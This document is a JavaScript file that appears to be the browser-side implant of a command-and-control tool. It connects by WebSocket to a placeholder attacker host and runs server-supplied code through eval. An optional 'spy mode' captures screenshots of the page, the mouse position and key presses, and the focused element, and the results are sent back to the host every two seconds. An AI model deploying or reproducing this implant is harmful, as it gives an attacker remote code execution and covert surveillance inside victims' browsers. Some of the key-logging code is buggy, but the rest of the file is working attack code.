const poll_url = "[[HOST_REPLACE_ME]]/w".replace("http", "ws");

var res = {
	poll: "hearthbeat",
	uid: results["UID"],
	action_results: [],
	spy_mode: null,
};
var config = { spy_mode: false };
var tries = 0;
while (tries < 3) {
	//console.log("Try: " + tries);
	try {
		var socket = new WebSocket(poll_url);
		if (socket != null && socket != undefined) {
			console.log(socket);
			socket.onopen = function () {
				//console.log("Status: connected.");
			};

			socket.onmessage = function (e) {
				res = {
					poll: "hearthbeat",
					uid: results["UID"],
					action_results: [],
					spy_mode: null,
				};

				if (config.spy_mode) {
					var mouse_x = null,
						mouse_y = null;
					var pressed_keys = [];

					document.body.addEventListener(
						"onmousemove",
						function (event) {
							mouse_x = event.clientX;
							mouse_y = event.clientY;
						}
					);
					document.body.addEventListener(
						"onkeydown",
						function (event) {
							keyboard.push[event.code];
						}
					);

					try {
						html2canvas(document.body, {
							imageTimeout: 0,
							allowTaint: true,
						}).then(function (canvas) {
							//console.log(canvas);
							const context = canvas.getContext("2d");
							context.beginPath();
							context.arc(
								mouse_x,
								mouse_y,
								5,
								0,
								2 * Math.PI,
								false
							);
							context.fillStyle = "red";
							context.fill();

							res["spy_mode"] = {
								mouse: { x: mouse_x, y: mouse_y }, //TODO: addEventListener onmousemove
								keyboard: pressed_keys, //TODO: addEventListener onkeydown
								image: canvas.toDataURL("image/png"),
								focused_element: document.activeElement,
							};
						});
					} catch (e) {
						res["spy_mode"] = {
							mouse: { x: mouse_x, y: mouse_y }, //TODO: addEventListener onmousemove
							keyboard: pressed_keys, //TODO: addEventListener onkeydown
							image: null,
							focused_element: document.activeElement,
						};
					}
				}

				var commands = JSON.parse(e.data); //This is a TriggerCommand json object
				console.log(e.data);
				if (commands != null) {
					for (var id in commands) {
						//console.log(commands[id]);
						//console.log("Evaluating: " + commands[id].Code);
						try {
							var action = {};
							action[commands[id].ID] = eval(commands[id].Code);
							res.action_results.push(action);
						} catch (ex) {
							console.log(ex);
							var action = {};
							action[commands[id].ID] = ex;
							res.action_results.push(action);
						}
					}
				}
			};

			socket.onclose = function (event) {
				//console.log("TODO: cleanup");
			};

			break;
		}
	} catch (e) {
		console.log(e);
		tries++;
		setTimeout(function () {
			sleep(1000);
		});
	}
}

// All good, we can start polling
if (tries < 3) {
	setInterval(function poll() {
		socket.send(JSON.stringify(res));
	}, 2000);
} else {
	//Send error?
}
